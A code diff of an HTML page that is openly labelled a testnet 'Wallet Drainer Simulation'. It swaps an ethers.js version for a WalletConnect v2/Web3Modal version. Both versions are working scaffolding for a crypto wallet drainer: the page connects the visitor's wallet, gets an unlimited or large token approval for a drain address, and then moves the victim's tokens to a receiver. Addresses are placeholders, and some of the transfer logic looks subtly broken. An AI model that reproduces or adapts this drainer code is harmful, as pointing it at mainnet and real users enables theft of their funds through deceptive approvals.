@@ -2,99 +2,72 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Sepolia Wallet Drainer Simulation</title>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.14.1/dist/ethers.min.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/umd/index.min.js"></script>
-  <style>
-    body { font-family: sans-serif; padding: 1rem; }
-    button { padding: .5rem 1rem; margin: .5rem; }
-    #status { margin-top: 1rem; }
-  </style>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>WalletConnect v2 Testnet DApp</title>
 </head>
 <body>
-  <h1>🔒 Sepolia Wallet Drainer Demo</h1>
-  <p>
-    <button id="connectBtn">Connect Wallet</button>
-    <button id="approveBtn" disabled>Approve Tokens</button>
-    <button id="drainBtn"   disabled>Drain Tokens</button>
-  </p>
-  <div id="status">Not connected</div>
+  <h1>WalletConnect v2 Testnet Token Drainer (Simulation)</h1>
+  <button id="connect">Connect Wallet</button>
+  <button id="approve">Approve Tokens</button>
+  <button id="drain">Transfer Tokens</button>
 
-  <script>
-  (async function(){
-    // ▶️ CONFIGURATION (CHANGE THESE!)
-    const SEPOLIA_RPC = 'https://sepolia.infura.io/v3/YOUR_INFURA_PROJECT_ID';
-    const TOKEN_ADDRESS = '0xYourDummyTokenAddress';       // Deployed Sepolia ERC-20
-    const DRAINER_ADDRESS = '0xYourDrainerContractAddress';// Sepolia Drainer contract
-    const RECEIVER_ADDRESS = '0xYourReceiverSepoliaAddress';// Where tokens end up
+  <script type="module">
+    import { EthereumClient, w3mConnectors, w3mProvider } from "https://unpkg.com/@web3modal/ethereum?module";
+    import { Web3Modal } from "https://unpkg.com/@web3modal/html?module";
+    import { configureChains, createConfig, getAccount, watchAccount } from "https://unpkg.com/@wagmi/core?module";
+    import { mainnet, sepolia } from "https://unpkg.com/@wagmi/core/chains?module";
+    import { createPublicClient, createWalletClient, http } from "https://unpkg.com/viem?module";
 
-    // ERC-20 & Drainer ABIs (minimal)
-    const ERC20_ABI = [
-      'function approve(address spender, uint256 amount) public returns(bool)',
-      'function allowance(address owner, address spender) public view returns(uint256)',
-      'function balanceOf(address owner) public view returns(uint256)'
-    ];
-    const DRAINER_ABI = [
-      'function drain(address tokenAddr, uint256 amount) external'
-    ];
+    const projectId = "0ca7babc6d9c2f3eabc56f96b19083fc"; // Free public projectId
+    const chains = [sepolia];
 
-    // UI Elements
-    const connectBtn = document.getElementById('connectBtn');
-    const approveBtn = document.getElementById('approveBtn');
-    const drainBtn   = document.getElementById('drainBtn');
-    const statusDiv  = document.getElementById('status');
+    const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);
+    const wagmiConfig = createConfig({ autoConnect: true, connectors: w3mConnectors({ projectId, chains }), publicClient });
 
-    let provider, signer, walletAddress;
+    const ethereumClient = new EthereumClient(wagmiConfig, chains);
+    const modal = new Web3Modal({ projectId }, ethereumClient);
 
-    // 1) CONNECT WALLET (MetaMask or WalletConnect)
-    connectBtn.addEventListener('click', async () => {
-      // If MetaMask
-      if (window.ethereum) {
-        provider = new ethers.BrowserProvider(window.ethereum);
-      } else {
-        // Fallback to WalletConnect v1
-        const wcProvider = new window.WalletConnectProvider.default({
-          rpc: { 11155111: SEPOLIA_RPC },
-          chainId: 11155111
-        });
-        await wcProvider.enable();
-        provider = new ethers.BrowserProvider(wcProvider);
+    let walletClient;
+    let userAddress;
+    const tokenAddress = "0xYourTestnetTokenAddress"; // Replace with your testnet token (ERC20)
+    const drainAddress = "0xReceiverWalletAddress";   // Replace with your receiver wallet (you control it)
+
+    document.getElementById("connect").onclick = async () => {
+      await modal.openModal();
+    };
+
+    watchAccount({
+      onChange(account) {
+        userAddress = account.address;
+        console.log("Connected address:", userAddress);
       }
-      signer = await provider.getSigner();
-      walletAddress = await signer.getAddress();
-      statusDiv.textContent = `Connected: ${walletAddress}`;
-      approveBtn.disabled = false;
     });
 
-    // 2) APPROVE TOKENS
-    approveBtn.addEventListener('click', async () => {
-      statusDiv.textContent = 'Sending approval…';
-      const token = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
-      // Approve unlimited (max-uint256)
-      const max = ethers.MaxUint256;
-      const tx = await token.approve(DRAINER_ADDRESS, max);
-      statusDiv.textContent = `Approval tx sent: ${tx.hash}`;
-      await tx.wait();
-      statusDiv.textContent = 'Approved! Ready to drain.';
-      drainBtn.disabled = false;
-    });
+    document.getElementById("approve").onclick = async () => {
+      walletClient = await ethereumClient.getWalletClient();
+      const tx = await walletClient.writeContract({
+        address: tokenAddress,
+        abi: [
+          "function approve(address spender, uint256 amount) public returns (bool)"
+        ],
+        functionName: "approve",
+        args: [drainAddress, BigInt(1000000 * 1e18)]
+      });
+      console.log("Approval TX:", tx);
+    };
 
-    // 3) DRAIN TOKENS
-    drainBtn.addEventListener('click', async () => {
-      statusDiv.textContent = 'Draining tokens…';
-      const token = new ethers.Contract(TOKEN_ADDRESS, ERC20_ABI, signer);
-      const bal   = await token.balanceOf(walletAddress);
-      if (bal.isZero()) {
-        statusDiv.textContent = 'No tokens to drain!';
-        return;
-      }
-      const drainer = new ethers.Contract(DRAINER_ADDRESS, DRAINER_ABI, signer);
-      const tx = await drainer.drain(TOKEN_ADDRESS, bal);
-      statusDiv.textContent = `Drain tx sent: ${tx.hash}`;
-      await tx.wait();
-      statusDiv.textContent = `Drained ${ethers.formatUnits(bal, 18)} tokens to ${RECEIVER_ADDRESS}`;
-    });
-  })();
+    document.getElementById("drain").onclick = async () => {
+      walletClient = await ethereumClient.getWalletClient();
+      const tx = await walletClient.writeContract({
+        address: tokenAddress,
+        abi: [
+          "function transferFrom(address from, address to, uint256 amount) public returns (bool)"
+        ],
+        functionName: "transferFrom",
+        args: [userAddress, drainAddress, BigInt(1000000 * 1e18)]
+      });
+      console.log("Draining TX:", tx);
+    };
   </script>
 </body>
 </html>
